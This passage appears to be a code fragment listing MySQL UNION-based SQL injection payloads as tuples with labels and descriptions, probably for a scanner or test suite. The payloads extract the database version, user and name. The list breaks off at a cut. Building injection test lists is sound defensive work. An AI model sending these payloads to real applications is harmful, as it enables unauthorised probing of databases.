    ("' UNION SELECT 1,version(),3--",
                                 2, "union",      "MySQL: pull database version into response"),
    ("' UNION SELECT 1,user(),3--",
                                 2, "union",      "MySQL: who is the DB running as?"),
    ("' UNION SELECT 1,database(),3--",
